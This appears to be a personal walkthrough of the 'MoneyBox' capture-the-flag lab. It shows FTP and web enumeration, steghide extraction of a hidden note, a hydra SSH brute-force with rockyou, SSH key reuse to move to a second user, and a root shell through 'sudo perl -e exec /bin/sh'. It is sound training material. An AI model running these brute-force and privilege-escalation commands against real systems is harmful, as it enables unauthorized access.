FTP has anon login and a jpg file visible on the nmap scan. I also find a web page on port 80.

i find /blogs  with gobuster and a fellow hacker leaves me a hint in the source code.
`<!--the hint is the another secret directory is S3cr3t-T3xt-->`

S3cr3t-T3xt

/S3cr3t-T3xt

`<!..Secret Key 3xtr4ctd4t4 >`

3xtr4ctd4t4

```php
steghide extract -sf trytofind.jpg
```

Pass: 3xtr4ctd4t4

```php
cat data.txt
```

```php
Hello.....  renu

I tell you something Important.Your Password is too Week So Change Your Password
Dont Underestimate it.......
```

```php
hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

```php
[22][ssh] host: 192.168.240.230   login: renu   password: 987654321
```

![[Pasted image 20240915082609.png]]

user: renu
pass: 987654321

local flag.txt is in renu home dir:
`8b559a34c56fe4fbeb7750805b87581b`

`Sorry, user renu may not run sudo on MoneyBox.`

I have access to a lily user authorized keys file.
`drwxr-xr-x 2 lily lily 4096 Feb 26  2021 .ssh`

After taking a second look i don't think i can do anything with it, i'll cd into dev/shm and get the tools uploaded.

It looks like i can copy renu id_rsa and use it to login to lily account
`/home/lily/.ssh/authorized_keys`

They both seem to use renu id key:

![[Pasted image 20240915084126.png]]

![[Pasted image 20240915084921.png]]

![[Pasted image 20240915084338.png]]

```php
sudo -l
```

```php
User lily may run the following commands on MoneyBox:
(ALL : ALL) NOPASSWD: /usr/bin/perl
```

https://gtfobins.github.io/gtfobins/perl/

```php
sudo perl -e 'exec "/bin/sh";'
```

![[Pasted image 20240915084658.png]]

---

08:48 2024-09-15
